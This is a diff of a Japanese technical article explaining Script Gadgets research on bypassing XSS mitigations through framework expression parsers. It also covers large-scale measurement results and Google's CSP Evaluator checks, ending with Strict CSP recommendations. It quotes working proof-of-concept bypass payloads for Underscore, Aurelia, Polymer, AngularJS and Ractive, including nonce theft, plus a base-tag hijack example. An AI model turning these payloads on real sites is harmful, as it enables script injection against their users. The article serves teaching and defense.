+#### 3.11 Underscore テンプレート：unsafe-eval の突破
+
+```html
+<div type=underscore/template> <% alert(1) %> </div>
+```
+
+- **なぜ動くか**: Underscoreのテンプレートは `<% %>` の中身を JavaScript として `eval` 相当で実行する。CSPが `unsafe-eval` を許可している環境でのみ成立する（gadgetが `eval` を呼ぶため）。
+
+#### 3.12 式パーサ系gadget：Aurelia / AngularJS / Polymer / Ractive / Vue
+
+最も強力なカテゴリ。これらのフレームワークは **eval を使わず、独自の式パーサ**を持つ。式をトークン化・パース・評価し、JavaScriptに「コンパイル」して実行する。原典の要点はこうだ。
+
+> With sufficiently complex expression language, we can run arbitrary JS code.
+> （十分に複雑な式言語があれば、私たちは任意のJSコードを実行できる。）
+
+この「自前の式評価器」があるおかげで、CSPが `unsafe-eval` を禁止していても、**ホスト許可リスト方式でも、nonce方式でも**バイパスが成立しうる。フレームワーク自身がインタプリタを内蔵しているからだ。実物のPoCを見る。
+
+**Aurelia**（新しい`<script>`要素を挿入するプログラムを式言語で記述）:
+
+```html
+<div ref="me"
+s.bind="$this.me.ownerDocument.createElement('script')"
+data-bar="${$this.me.s.src='data:,alert(1)'}"
+data-foobar="${$this.me.ownerDocument.body.appendChild($this.me.s)}"></div>
+```
+
+**Polymer 1.x**（"private" な `_properties` を上書きしてフレームワークを混乱させる。ヒント：下から上へ読む）:
+
+```html
+<template is=dom-bind><div
+ five={{insert(me._nodes.0.scriptprop)}}
+ four="{{set('insert',me.root.ownerDocument.body.appendChild)}}"
+ three="{{set('me',nextSibling.previousSibling)}}"
+ two={{set('_nodes.0.scriptprop.src','data:\,alert(1)')}}
+ scriptprop={{_factory()}}
+ one={{set('_factoryArgs.0','script')}} >
+</template>
+```
+
+**Polymer 1.x で whitelist / nonce CSP を突破**:
+
+```html
+<template is=dom-bind><div
+      c={{alert('1',ownerDocument.defaultView)}}
+      b={{set('_rootDataHost',ownerDocument.defaultView)}}>
+</div></template>
+```
+
+**AngularJS 1.6+ で whitelist / nonce CSP を突破**:
+
+```html
+<div ng-app ng-csp ng-focus="x=$event.view.window;x.alert(1)">
+```
+
+- **なぜ動くか（式パーサ全般）**: これらは `<script>`・`eval`・`javascript:` を一切使わない。フレームワークの**式評価エンジンそのもの**を借用して、`ownerDocument.createElement('script')` や `appendChild`、`$event.view.window.alert` といったDOM/ネイティブAPIをつなぎ、任意処理を組み立てる。CSPは「送信元」も「evalの有無」も見ているが、フレームワーク内蔵インタプリタによる評価は、CSPの監視対象の外にある。`ng-csp` は AngularJS を「CSP互換モード」（`Function`コンストラクタを使わないモード）で動かす属性で、これを付けることで unsafe-eval なしでも AngularJS の式評価が働く点が鍵。
+
+**Ractive で nonce の窃取・再利用**（極めつけ）:
+
+```html
+<script id="template" type="text/ractive">
+  <iframe srcdoc="
+      <script nonce={{@global.document.currentScript.nonce}}>
+        alert(1337)
+      </{{}}script>">
+  </iframe>
+</script>
+```
+
+- **なぜ動くか**: nonce方式CSPは「サーバが発行した秘密のnonceを持つ`<script>`だけ実行する」。攻撃者はnonceを知らないはずだが、Ractiveの式言語で `document.currentScript.nonce` を読み出し、それを `srcdoc` で生成する子フレーム内の `<script nonce=...>` に**再利用**する。`</{{}}script>` は、式展開で空文字を挟むことでパーサの `</script>` 検出を避けるトリック。これはnonceを「秘密」たらしめる前提を、gadget経由で崩している。
+
+#### 3.13 gadgetのまとめ（16ライブラリ）
+
+調査対象の16ライブラリ:
+
+> AngularJS 1.x, Aurelia, Bootstrap, Closure, Dojo Toolkit, Emberjs, Knockout, Polymer 1.x, Ractive, React, RequireJS, Underscore / Backbone, Vue.js, jQuery, jQuery Mobile, jQuery UI
+
+結論:
+
+> - It turned out they are prevalent（gadgetは蔓延していた）
+> - **Only one library did not have a useful gadget**（有用なgadgetを持たなかったのは1つだけ＝React）
+> - XSSes in Aurelia, AngularJS (1.x), Polymer (1.x) can bypass **all** mitigations via expression parsers.（Aurelia・AngularJS 1.x・Polymer 1.x のXSSは、式パーサ経由で**すべての**緩和策をバイパスできる。）
+> - EmberJS — gadgets only in development version（Emberのgadgetは開発版のみ）
+
+そして手法の集計（framework/mitigation の組合せ）:
+
+> Bypasses in **53.13%** of the framework/mitigation pairs.
+> （フレームワーク×緩和策の組合せの **53.13%** でバイパスが成立した。）
+
+> 出典: Breaking XSS mitigations via Script Gadgets — https://blackhat.com/docs/us-17/thursday/us-17-Lekies-Dont-Trust-The-DOM-Bypassing-XSS-Mitigations-Via-Script-Gadgets.pdf
+
+---
+
+### 4. 大規模実測：Alexa上位5,000サイトの実態
+
+論文の後半（Samuel Groß, Martin Johns との共同研究）は、gadgetが**実運用サイトのユーザーランドコード**にも普遍的に存在することを、大規模クロールで示す。
+
+#### 4.1 手法
+
+> We used **taint tracking** to detect data flows from the DOM into sinks. Each data flow represents a potential gadget.
+> （テイント追跡で、DOMからsinkへのデータフローを検出した。各データフローは潜在的なgadgetを表す。）
+
+テイント追跡（taint tracking）とは、「攻撃者が制御しうる入力（DOM属性など＝source）」に印（テイント）を付け、それが危険な処理（`innerHTML`・`eval`・`createElement('script')` など＝sink）に到達するかを実行時に追跡する手法。到達した各経路が「gadget候補」になる。イメージはこうだ。
+
+```js
+elem.innerHTML = $('#mydiv').attr('data-text');   // data-text(source) → innerHTML(sink)
+```
+```html
+<div id="mydiv" data-text="<script>xssgadget()</script>">
+```
+
+クロール対象:
+
+> - Alexa Top 5,000 サイトを1階層深く（one level deep）、同一セカンドレベルドメイン内の全リンクをたどってクロール。
+
+#### 4.2 クロール規模
+
+> - 4,557 の second-level ドメイン、37,232 のサブドメイン、**647,085** 個の個別Webページ
+
+#### 4.3 テイントされたデータフロー
+
+> - **82%** のサイトが、少なくとも1つの関連データフローを持っていた。
+> - 1URLあたり平均 **6.72** 回のsink呼び出し、セカンドレベルドメインあたり **450** 回。
+> - 総計 **4,352,491** 回のsink呼び出し、**22,379** 個のユニークなgadget候補（ドメイン・sink・sourceの組合せ）。
+
+#### 4.4 緩和策別の潜在gadget
+
+**CSP関連:**
+> - **48%** のドメインが、潜在的な `eval` gadget を持つ（＝CSP unsafe-eval が有効なら悪用されうる）。
+> - **73%** のドメインが、潜在的な strict-dynamic gadget を持つ（`script.text`/`src` へのフロー、jQueryの`.html()`、`createElement(tainted).text` など）。
+
+**HTMLサニタイザ関連:**
+> - **78%** のドメインが、HTML属性からの少なくとも1つのデータフローを持つ。
+> - **60%** が `data-*` 属性からのフロー、**16%** が `id` 属性から、**10%** が `class` 属性から。
+
+#### 4.5 実証済みgadget
+
+> - **1,762,823** 個のgadgetベース攻撃候補を生成。
+> - そのうち **285,894** 個のgadgetを、**906ドメイン（19.88%）** で実際に有効と検証した。
+> - この数字は**下限**であり、実際の数はもっと多いと考えられる。
+
+つまり、「Alexa上位5,000サイトの約20%は、gadget経由で実際にXSS緩和策をバイパスできる状態にあった」ことが、生成・検証の両方で裏付けられた。
+
+> 出典: Breaking XSS mitigations via Script Gadgets — https://blackhat.com/docs/us-17/thursday/us-17-Lekies-Dont-Trust-The-DOM-Bypassing-XSS-Mitigations-Via-Script-Gadgets.pdf
+
+---
+
+### 5. 防御・展望（原典の結論）
+
+原典は「gadgetを潰す」アプローチの限界を率直に述べる。
+
+**緩和策に「gadget対応」を足すのは困難:**
+> - ライブラリと式言語が多数存在する。
+> - 誤検知（false positive）が避けられない。
+
+**フレームワーク側でgadgetを潰すのも問題:**
+> - ライブラリが多すぎる。
+> - gadgetはXSS本体より発見が難しいことがある。
+> - 開発者は反発する――「これはバグじゃない（XSSこそがバグだ）」。
+> - gadgetが**機能そのもの**であることもある（例：式言語）。
+
+**本質的な結論:**
+> - A novice programmer, today, cannot write a complex but secure application. The task is getting harder, not easier.（今日、初級プログラマが複雑かつ安全なアプリを書くことはできない。この作業は易しくなるどころか難しくなっている。）
+> - We need to make the platform **secure-by-default**（プラットフォームを**デフォルトで安全**にする必要がある）:
+>   - 安全なDOM API（Safe DOM APIs）
+>   - ブラウザのより良いプリミティブ
+>   - ビルド時セキュリティ（例：プリコンパイル済みテンプレート＝Angular 2 の AOT）
+> - より良い分離プリミティブ（Suborigins, `<iframe sandbox>`, Isolated scripts）が必要。
+
+この「secure-by-default」への転換の思想は、後年の **Trusted Types**（DOM XSSのsinkを型で縛る仕組み、別節で詳述）や、React/Angular 2+ のような「自動エスケープ・プリコンパイルテンプレート」を持つフレームワークの普及として結実していく。React が唯一 gadget を持たなかったのは偶然ではなく、`dangerouslySetInnerHTML` を明示的に呼ばない限り文字列がHTMLとして解釈されない「デフォルト安全」設計の帰結である。
+
+> 出典: Breaking XSS mitigations via Script Gadgets — https://blackhat.com/docs/us-17/thursday/us-17-Lekies-Dont-Trust-The-DOM-Bypassing-XSS-Mitigations-Via-Script-Gadgets.pdf
+
+---
+
+### 6. Google CSP Evaluator
+
+#### 6.1 ツールの位置づけ
+
+**CSP Evaluator**（https://csp-evaluator.withgoogle.com/、コアライブラリは npm の `csp_evaluator`、ソースは `github.com/google/csp-evaluator`）は、CSPポリシー文字列を貼り付けると、そのポリシーに含まれる**構文的・意味的な弱点**を自動検出し、重大度付きで一覧表示するツール兼ライブラリである。READMEはこう述べる。
+
+> CSP Evaluator ... helps identify subtle CSP bypasses which undermine the value of a policy. CSP Evaluator checks are based on a **large-scale study**.（CSP Evaluatorは、ポリシーの価値を損なう巧妙なCSPバイパスの特定を助ける。検査は**大規模研究**に基づく。）
+
+この「large-scale study」こそ、第4〜5節で見た Script Gadgets の実測研究（および同グループの CSP 導入実態調査 pub45542）である。CSP Evaluator と Script Gadgets 研究が表裏一体、というのはこの意味だ。CSP Evaluator は「gadgetを持つと知られたホストを許可リストに入れていないか」を機械的にチェックする。
+
+- CSPバージョン選択: v3（nonceベース＋後方互換チェック）／v3／v2／v1 の4モード。nonceは v2 以降でのみ有効で、「CSP v1 しかサポートしないブラウザは nonce を無視する」ため、想定するブラウザに応じて評価が変わる。
+- Chrome拡張としても提供される。
+- 免責: "Google provides no guarantees or warranties for this tool."（公式製品ではない。）
+
+#### 6.2 重大度（Severity）の定義
+
+`finding.ts` の `Severity` enum（数値が小さいほど深刻）:
+
+```
+HIGH = 10          // 高（実際にバイパス可能）
+SYNTAX = 20        // 構文エラー
+MEDIUM = 30        // 中
+HIGH_MAYBE = 40    // 高の可能性
+STRICT_CSP = 45    // Strict CSPへの改善提案
+MEDIUM_MAYBE = 50  // 中の可能性
+INFO = 60          // 情報
+NONE = 100         // 問題なし
+```
+
+#### 6.3 実装されている主な検査項目（ソースからの実物）
+
+以下は `checks/security_checks.ts` と `checks/strictcsp_checks.ts` に実装された検査関数と、**実際の警告メッセージ・重大度**である。原理を添えて読む。
+
+**(1) unsafe-inline（`checkScriptUnsafeInline`）— HIGH**
+> "'unsafe-inline' allows the execution of unsafe in-page scripts and event handlers."
+
+`unsafe-inline` はページ上のあらゆるインラインスクリプト・イベントハンドラを許可する。攻撃者が注入したものも区別なく通るため、素朴なXSSすら防げなくなる。CSPの送信元チェック機構そのものを無効化するキーワードなので最高重大度。（`unsafe-hashes` は MEDIUM_MAYBE。）
+
+**(2) unsafe-eval（`checkScriptUnsafeEval`）— MEDIUM_MAYBE**
+> "'unsafe-eval' allows the execution of code injected into DOM APIs such as eval()."
+
+`eval()`・`setTimeout("string")`・`new Function(...)` 等の文字列→コード変換を許可する。第3節の Underscore テンプレートや Knockout のような eval系gadget を成立させる前提となる。
+
+**(3) plain URLスキーム（`checkPlainUrlSchemes`）— HIGH**
+> "[scheme] URI in [directive] allows the execution of unsafe scripts."
+
+`data:`・`http:` などのスキームを `script-src` に許可すると、`data:` URI で任意スクリプトを持ち込めてしまう（第3節の RequireJS/Aurelia が使った `data:,alert(1)` を想起）。
+
+**(4) ワイルドカード（`checkWildcards`）— HIGH**
+> "[directive] should not allow '*' as source"
+
+`*` は事実上あらゆるオリジンを許可し、CSPの意味を消す。
+
+**(5) object-src欠落（`checkMissingObjectSrcDirective`）— HIGH**
+> "Missing object-src allows the injection of plugins which can execute JavaScript..."
+
+`<object>`/`<embed>` 経由のコード実行を防ぐため `object-src 'none'` を要求する。
+
+**(6) script-src欠落（`checkMissingScriptSrcDirective`）— HIGH**
+> "script-src directive is missing."
+
+`script-src` が無ければスクリプト実行が無制限。
+
+**(7) base-uri欠落（`checkMissingBaseUriDirective`）— HIGH**
+> "Missing base-uri allows the injection of base tags. They can be used to set the base URL..."
+
+`base-uri` 未設定だと、攻撃者が `<base href="https://attacker.example/">` を注入して、ページ内の相対パス指定スクリプト（`<script src="/app.js">` 等）の読み込み元を攻撃者サーバへすり替えられる。ブラウザは相対URLを `document.baseURI`（`<base>`で変更可能）基準で解決するため、`script-src 'self'` の「self」の解釈基準そのものが乗っ取られる。`base-uri 'none'` または `'self'` を強く推奨。
+
+**(8) script許可リストバイパス（`checkScriptAllowlistBypass`）— HIGH / MEDIUM_MAYBE**
+> - "'self' can be problematic if you host JSONP, AngularJS or user uploaded files." （MEDIUM_MAYBE）
+> - "[domain] is known to host [endpoints] which allow to bypass this CSP." （HIGH）
+> - "No bypass found; make sure that this URL doesn't serve JSONP replies or Angular libraries." （MEDIUM_MAYBE）
+
+これが Script Gadgets 研究と直結する検査。許可したドメインが、**既知のJSONPエンドポイント**（`jsonp.ts`）や **AngularJS配信URL**（`angular.ts`）を含む場合、名指しで HIGH 警告を出す。原理は「オリジン単位の許可は、そのオリジン上の安全なファイルと危険なファイル（JSONP・gadgetライブラリ）を区別できない」こと。
+
+CSP Evaluator が同梱する既知バイパス一覧（抜粋、実物）:
+- JSONP系（`jsonp.ts` の `URLS`）: `//www.google-analytics.com/gtm/js`、`//translate.googleapis.com/translate_a/l`、`//accounts.google.com/o/oauth2/revoke`、`//api.facebook.com/restserver.php`、`//syndication.twitter.com/widgets/timelines/...`、`//www.youtube.com/profile_style`、`//api.vk.com/method/wall.get` など多数。
+- eval が必要なJSONP系（`NEEDS_EVAL`）: `googletagmanager.com`、`www.googleadservices.com`、`google-analytics.com` など。
+- AngularJS配信（`angular.ts` の `URLS`）: `//ajax.googleapis.com/ajax/libs/angularjs/1.2.0rc1/angular-route.min.js`、`//cdnjs.cloudflare.com/ajax/libs/angular.js/1.2.16/angular.min.js`、`//cdn.jsdelivr.net/angularjs/1.1.2/angular.min.js`、`//www.gstatic.com/fsn/angular_js-bundle1.js` など多数。
+- Flash（`flash.ts` の `URLS`）: `//vk.com/swf/video.swf`、`//ajax.googleapis.com/ajax/libs/yui/2.8.0r4/build/charts/assets/charts.swf`。
+
+ソースの注記どおり「This list only contains popular bypasses and is by no means complete.（人気のバイパスのみで、網羅的ではない）」――つまり載っていないから安全、とは言えない。
+
+**(9) Flash object許可リストバイパス（`checkFlashObjectAllowlistBypass`）— HIGH / MEDIUM_MAYBE**
+> - "[hostname] is known to host Flash files which allow to bypass this CSP." （HIGH）
+> - "Can you restrict object-src to 'none' only?" （MEDIUM_MAYBE）
+
+**(10) IPソース（`checkIpSource`）— INFO**
+> - "[directive] directive allows localhost as source. ..."
+> - "[directive] directive has an IP-Address as source: [host] (will be ignored by browsers!)."
+
+CSPのホストソースにIPアドレスを書いても**ブラウザは無視する**（ホスト名として解釈されない）点への注意喚起。
+
+**(11) 非推奨ディレクティブ（`checkDeprecatedDirective`）— INFO**
+> - "reflected-xss is deprecated since CSP2. Please, use the X-XSS-Protection header instead."
+> - "referrer is deprecated since CSP2. Please, use the Referrer-Policy header instead."
+> - "disown-opener is deprecated since CSP3. ..."
+> - "prefetch-src is deprecated since CSP3. ..."
+
+**(12) nonce長・文字集合（`checkNonceLength`）— MEDIUM / INFO**
+> - "Nonces should be at least 8 characters long." （MEDIUM）
+> - "Nonces should only use the base64 charset." （INFO）
+
+短いnonceは推測されうる。第3節の Ractive のnonce窃取とは別問題だが、「nonceの強度」もCSPの前提であることを示す。
+
+**(13) HTTP送信（`checkSrcHttp`）— MEDIUM**
+> "Use HTTPS to send violation reports securely." / "Allow only resources downloaded over HTTPS."
+
+**Strict CSP系（`strictcsp_checks.ts`）— 主に STRICT_CSP（改善提案）:**
+
+**(14) strict-dynamic推奨（`checkStrictDynamic`）— STRICT_CSP**
+> "Host allowlists can frequently be bypassed. Consider using 'strict-dynamic' in combination with CSP nonces or hashes."
+
+これがツール全体の中心メッセージ。「**ホスト許可リストは頻繁にバイパスされうる**」――まさに Script Gadgets 研究が実証したこと――ので、nonce/hash と `strict-dynamic` の組合せへ移行せよ、という提案。
+
+**(15) strict-dynamic単独の警告（`checkStrictDynamicNotStandalone`）— INFO**
+> "'strict-dynamic' without a CSP nonce/hash will block all scripts."
+
+**(16) 後方互換フォールバック（`checkUnsafeInlineFallback` / `checkAllowlistFallback`）— STRICT_CSP**
+> - "Consider adding 'unsafe-inline' (ignored by browsers supporting nonces/hashes) to be backward compatible with older browsers."
+> - "Consider adding https: and http: url schemes (ignored by browsers supporting 'strict-dynamic') to be backward compatible with older browsers."
+
+nonce/strict-dynamic対応ブラウザは `unsafe-inline` や `http:/https:` フォールバックを**無視する**という仕様を逆手に取り、旧ブラウザ向けの互換性を安全に確保する定石。
+
+**(17) Trusted Types推奨（`checkRequiresTrustedTypesForScripts`）— INFO**
+> "Consider requiring Trusted Types for scripts to lock down DOM XSS injection sinks. You can do this by adding \"require-trusted-types-for 'script'\" to your policy."
+
+Script Gadgets が突いた「DOMのsinkに文字列が流れ込む」問題を、根本から縛る Trusted Types への誘導。原典の "secure-by-default" 提言の実装形である。
+
+#### 6.4 推奨される「Strict CSP」
+
+上記の検査群が最終的に勧める理想形はこうだ。
+
+```
+Content-Security-Policy:
+  script-src 'nonce-{ランダム値}' 'strict-dynamic' https: 'unsafe-inline';
+  object-src 'none';
+  base-uri 'none';
+  require-trusted-types-for 'script';
+```
+
+- **なぜ有効か**: `'strict-dynamic'` はブラウザに**ホスト許可リストを完全に無視**させ、「nonce/hashが一致した信頼スクリプトが動的生成したスクリプトはその信頼を継承する」という**伝播ベースの信頼モデル**へ切り替える。これで「どのホストにgadgetがあるか」という問題設定そのものが消える。`https:` と `'unsafe-inline'` は、nonce非対応の旧ブラウザ向けフォールバック（対応ブラウザは無視）。`base-uri 'none'` は `<base>` すり替えを封じ、`object-src 'none'` はプラグイン経由実行を封じる。`require-trusted-types-for 'script'` はDOM XSSのsinkを型で縛る。逆に言えば、**ホスト許可リスト方式を使い続ける限り、Script Gadgetsによるバイパスの理論的リスクは残る**――これが CSP Evaluator と Black Hat 論文に共通する最終メッセージである。
+
+> 出典: CSP Evaluator（github.com/google/csp-evaluator, checks/security_checks.ts, checks/strictcsp_checks.ts, allowlist_bypasses/*.ts）— https://csp-evaluator.withgoogle.com/
+
+---
+
+### 7. まとめ：この節の核心
+
+- **Script Gadgets研究（Black Hat/CCS 2017）**は、「CSP・サニタイザ・XSSフィルタ・WAFは、構文（タグ・属性・URLスキーム）しか見ておらず、ページ上の正規JavaScriptが持つ『意味』までは検証できない」という構造的限界を、**16ライブラリ・Alexa上位5,000サイト**で実証した。フレームワーク×緩和策の **53.13%** でバイパスが成立し、Alexa上位の約 **20%（906ドメイン）** で実際に有効なgadgetを検証した。
+- 特に**式パーサ内蔵フレームワーク（AngularJS 1.x・Aurelia・Polymer 1.x）**は、`<script>`も`eval`も使わずに**すべての**緩和策をバイパスできた。gadgetを唯一持たなかったのは、デフォルト安全設計の **React** だった。
+- **CSP Evaluator**は、この研究成果を「機械的に検出できる危険パターン」に落とし込んだ実務ツールである。`unsafe-inline`（HIGH）、広すぎるホスト許可（HIGH）、`base-uri`欠落（HIGH）、そして**既知のJSONP/AngularJS/Flash配信ホストを許可していないか**（HIGH）を具体的に指摘し、最終的に **nonce + strict-dynamic + Trusted Types** の「Strict CSP」へ導く。
+- この節の最重要ポイントは、**「CSPを設定した」「サニタイザを通した」という事実だけでは、ページ上に存在する正規コードの挙動まで保証されない**ということ。防御の本質は、緩和策の積み増しではなく、Black Hat論文が説く **secure-by-default**（デフォルトで安全なプラットフォーム／フレームワーク／API）への移行にある。次節以降では、この考え方を発展させ、DOM Clobbering やコード再利用攻撃（Code-Reuse）の具体例をさらに掘り下げる。
 
 ---
 
 ## コード再利用攻撃（CCS17論文 / Google PoC）
 
-これまでの章では「攻撃者が任意のJavaScriptコードをページに注入できるかどうか」を中心に議論してきた。しかし、CSP（Content Security Policy: ブラウザに「このサイトではどこから来たスクリプトを実行してよいか」を宣言するHTTPレスポンスヘッダ）の`strict-dynamic`や、`unsafe-eval`を禁止した厳格な設定、あるいはDOMベースの入力サニタイズ（sanitization: 危険な文字列を無害化する処理）が正しく実装されていても、なお実行可能なコードへとつながる攻撃経路が存在する。それが本節で扱う**コード再利用攻撃（Code-Reuse Attacks for the Web）**、通称**Script Gadgets（スクリプト・ガジェット）攻撃**である。
+前節（s4j）では、Script Gadgets の考え方とツール（CSP Evaluator / Black Hat 発表）を概観した。本節では、その理論的土台となった査読付き学術論文 **"Code-Reuse Attacks for the Web: Breaking Cross-Site Scripting Mitigations via Script Gadgets"（ACM CCS 2017）** を一次資料として精読し、ガジェットの**体系的な分類**、各種XSS対策の**具体的な突破コード**、そして「実際のWebでどれほど蔓延しているか」を測った**大規模実証実験の数値**まで、原典に沿って詳しく解説する。あわせて、これらの攻撃を再現可能な形で公開した **Google の `script-gadgets` PoC リポジトリ**の構造と、フレームワーク別の突破一覧表（bypass matrix）を扱う。
 
-この攻撃はメモリ破壊系の脆弱性で古くから知られる「ROP（Return-Oriented Programming: 攻撃者が新しいコードを注入する代わりに、プログラム内に既に存在する命令断片＝ガジェットをつなぎ合わせて任意の処理を実現する手法）」の発想をWebアプリケーションに輸入したものである。攻撃者は自分で新しい`<script>`タグや`eval()`呼び出しを書き込む必要がない。ページに既にロードされている正規のJavaScriptライブラリ（jQuery、Angular、Vue、各種UIフレームワークなど）の中に潜む「無害に見えるコード片＝ガジェット」を、DOM属性への文字列注入だけで起動し、最終的に任意コード実行へとつなげる。
+この論文が重要なのは、「CSP・サニタイザ・WAF・ブラウザ内蔵XSSフィルタという当時の4大XSS対策すべてが、原理的に同じ盲点を持つ」ことを、机上の空論ではなく **Alexa 上位5000サイト・約65万ページのクロール**によって定量的に証明した点にある。結論を先に言えば、著者らは「**今日書かれているWebアプリのほとんどのXSS対策はバイパス可能だと想定してよい**」（原文: *we assume most mitigation techniques in web applications written today can be bypassed*）と述べている。
 
-### 1. なぜCSPやサニタイザだけでは防げないのか（仕組みの核心）
+### 1. 論文の位置づけと「コード再利用攻撃」という比喩
 
-XSS対策の多くは「スクリプトとして解釈される構文（`<script>`タグ、`on*`イベントハンドラ属性、`javascript:`URIなど）が注入されること」を防ぐ、あるいは「注入元のオリジンを制限する」ことに主眼を置く。
+著者は Sebastian Lekies、Krzysztof Kotowicz、Eduardo A. Vela Nava（以上 Google）、Samuel Groß、Martin Johns（以上 SAP）。2017年10月、テキサス州ダラスで開催された CCS'17 のセッション "H2: Code Reuse Attacks" で発表された。
 
-- CSPの`script-src 'strict-dynamic'`は、「信頼されたスクリプトが動的に生成した`<script>`要素は、たとえnonceやhashを持たなくても実行を許可する」というルールである。これは「動的に読み込まれるスクリプトを許可リストで管理するのが現実的に困難」という問題に対処するための緩和策だが、裏を返せば「信頼されたスクリプトが、攻撃者の入力を使って新しい`<script>`要素やイベントハンドラを組み立ててしまえば、それはそのまま実行される」という前提に立っている。
-- サニタイザ（DOMPurifyなど）はHTML/属性の**構文レベル**での危険性を判定する。しかし「一見ただのテキスト値やCSSクラス名」に見える文字列が、後続のJavaScriptコード（ガジェット）によって`eval`や`innerHTML`やDOM API呼び出しの引数として再解釈されるケースまでは検出できない。
+論文の中心概念は **script gadget（スクリプトガジェット）**、すなわち「Webページの正規コード（アプリ自身、またはロード済みのライブラリ/フレームワーク）の中に含まれる、**特定の形をしたDOM内容の存在に反応して動作する、小さなJavaScriptコード片**」である。攻撃の流れはこうだ。
 
-つまりCode-Reuse Attackの本質は、**「攻撃者が注入した時点では無害なデータ」が「アプリケーション内の別の正規コード（ガジェット）によって、実行可能なコンテキストへ変換される」**という多段の「データフロー」を突く点にある。CSPは「誰のスクリプトが動くか」は制御できても、「そのスクリプトが自分自身のロジックとして何を実行するか」までは制御できない。これがWebにおけるROPが成立する根本原理である。
+1. 攻撃者は、一見無害なHTMLマークアップ（`<script>`もイベントハンドラも`javascript:`も含まない）をページに注入する。
+2. 現行のXSS対策はそのマークアップに実行可能なスクリプトが無いと判断し、**そのまま通してしまう**。
+3. しかしページの寿命の間に、そのサイトのスクリプトガジェットが注入内容を拾い上げ、**意図せずそのペイロードを実行可能なコードへと変換してしまう**。
 
-### 2. Script Gadgetsとは何か（定義と分類）
+著者はこれを、メモリ破壊系の脆弱性攻略で使われる **return-to-libc / ROP（Return-Oriented Programming）** に明確になぞらえている。ROPが「バイナリ中に既に存在する実行可能な命令列（gadget）を再利用して任意処理を組み立てる」のに対し、Script Gadgets は「ページ中に既に存在する正規JavaScriptロジックを再利用する」。攻撃者は新しいコードを持ち込まず、**既存コードの正規の振る舞いを鎖のようにつなぐ**だけで任意コード実行に至る。これが「Web版コード再利用攻撃」という呼称の由来である。
 
-**Script Gadget（スクリプト・ガジェット）**とは、次の性質を持つ既存コード片を指す。
+> 補足: この攻撃には、初期のHTMLインジェクション口が必要である。それが反射型か格納型か、あるいはサニタイザを通したDOMインジェクションかは**攻撃には無関係**（irrelevant）だと論文は明言する。攻撃者モデルはあくまで古典的なXSS攻撃者、すなわち「対象文書のコンテンツに任意のHTMLを注入できる者」である。
 
-1. アプリケーションに正規に組み込まれている（ライブラリのコード、あるいはアプリ自身のコード）。
-2. DOM上の何らかの属性・データ値・URLフラグメントなど、攻撃者が（間接的にでも）書き込める場所を読み取る。
-3. 読み取った値を、最終的に`eval`系API、`innerHTML`、`<script>`要素の生成、イベントハンドラ登録など、コードとして実行されうる**sink（入力が最終的に実行・解釈される危険な代入先）**へ渡してしまう。
+### 2. 前提となる技術背景：DOMセレクタと「無害なHTML」
 
-典型的なガジェットのパターンには次のようなものがある。
+#### 2.1 なぜガジェットが「トリガー」されるのか
 
-- **カスタムデータ属性駆動型**: `data-*`属性の値をライブラリが読み取り、それをテンプレートとして評価する。
-- **イベント委譲（イベントデリゲーション）型**: 要素の`class`名やその他の属性をもとにハンドラを動的にバインドする仕組みが、攻撃者の指定したクラス名文字列を経由してコードとして解釈される。
-- **テンプレートエンジン型**: `{{ }}`のようなテンプレート構文をクライアント側でその都度評価するライブラリ（Angular 1.x系のテンプレートインジェクションが有名）。
-- **ルーティング/ハッシュ駆動型**: URLの`#`以降の値を読んで、それを元にDOM操作やコード実行を行う。
+現代のJavaScriptは、`document.getElementById` や `document.getElementsByClassName`、そしてそれらの下敷きである `document.querySelectorAll` を通じて、絶えずDOMからデータを読み込んでいる。これらはすべて **DOMセレクタ**（タグ名 `div`、ID `#foo`、クラス `.foo`、属性 `[foo]`）に基づく。jQuery の `$()` 関数はこのセレクタ言語に大量の糖衣構文を足したものにすぎない。
 
-これらは単体では「機能」であって「脆弱性」ではない。しかし、CSPで`<script>`タグの直接注入や`unsafe-inline`が塞がれている状況で、攻撃者が唯一書き込める場所（例えば掲示板の投稿本文がある要素の`class`属性やDOMプロパティに反映される、といったマイナーなXSSシンク）がこれらガジェットの「入力」と一致した瞬間、CSPを迂回した任意コード実行が成立する。
+ライブラリは「特定のセレクタにマッチする要素を見つけて、その属性値に応じて処理する」という設計を当たり前に持つ。例えば「`tooltip` 属性を持つ全要素を装飾する」といった具合だ。攻撃者は、**まさにそのセレクタにマッチする無害な要素**を注入することで、正規コード（ガジェット）に自分の入力を「掴ませる」ことができる。
 
-### 3. 攻撃の具体例（原理の理解のためのモデルケース）
+論文が挙げる、DOMからデータを読む正規コードの典型例（Listing 2 より）:
 
-以下は、実際のCCS17論文やGoogleのPoCで示された考え方をベースに、原理を理解するための簡略化した例である（厳密な実コードはリポジトリ内の各フレームワーク別PoCを参照されたい）。
+```js
+// ユーザーランドのコード
+var button = document.getElementById("button");
+button.getAttribute("data-text");
+
+var links = $("a[href]").children();
+
+// Aureliaフレームワークが 'ref' 属性を読む箇所
+if (attrName === 'ref') {
+  info.attrName = attrName;
+  info.attrValue = attrValue;
+  info.expression = new NameExpression(
+    this.parser.parse(attrValue), 'element',
+    resources.lookupFunctions);
+}
+
+// Vue.js が v-html 属性を読む箇所
+if ((binding = el.attrsMap['v-html'])) {
+  return [{ type: EXPRESSION, value: binding }]
+}
+```
+
+**なぜ動くか**: これらはどれも「攻撃者が注入し得る属性名（`data-text`, `ref`, `v-html`）」を読んでいる。属性値そのものは攻撃者が完全に制御できるので、後段でこの値がコード実行シンク（`innerHTML`、`eval`、`new Function` など）に流れれば、それがガジェットチェーンの入り口になる。
+
+#### 2.2 「無害なHTML（benign HTML）」の定義
+
+論文は、現行の対策が素通しする「無害なHTML」を厳密に定義する。すなわち **`<script>`タグ、インラインイベントハンドラ、`javascript:`/`data:` を持つ `src`/`href`、その他JavaScript実行能力を持つタグ（`<link rel=import>`、`<meta>`、`<style>`）を一切含まないマークアップ**である（Listing 1）:
 
 ```html
-<!-- CSPヘッダ例: strict-dynamic を用いた「モダンな」設定 -->
-<!-- Content-Security-Policy: script-src 'strict-dynamic' 'nonce-abc123' -->
-
-<!-- 攻撃者が注入できるのは class 属性の値だけ、というシナリオ -->
-<div id="userProfile" class="ATTACKER_CONTROLLED_VALUE">こんにちは</div>
-
-<script nonce="abc123" src="https://cdn.example.com/some-ui-framework.js"></script>
+<div class="greeting">
+  <b>Hello</b> world!
+</div>
 ```
 
-ここで、`some-ui-framework.js`（正規の、nonceで許可された信頼済みスクリプト）が、ページ内の要素に対して次のような処理を行っていたとする。
